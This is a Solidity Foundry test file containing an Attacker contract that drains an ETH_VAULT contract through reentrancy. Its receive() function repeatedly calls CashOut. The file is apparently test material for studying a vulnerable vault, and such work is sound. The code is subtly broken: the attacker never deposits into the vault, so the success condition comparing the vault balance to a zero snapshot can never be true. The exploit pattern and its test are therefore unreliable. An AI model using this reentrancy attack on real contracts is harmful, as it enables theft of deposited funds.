
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {

    ETH_VAULT public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ETH_VAULT(address(0));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal >= 1 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.Deposit{value: attackVal}();
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {

    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = ETH_VAULT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));

        victim.CashOut(val);

        if (victim.balances(address(this)) == 0 && address(victim).balance < initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.CashOut(attackAmount);
            attackCallCount++;
        }
    }
}
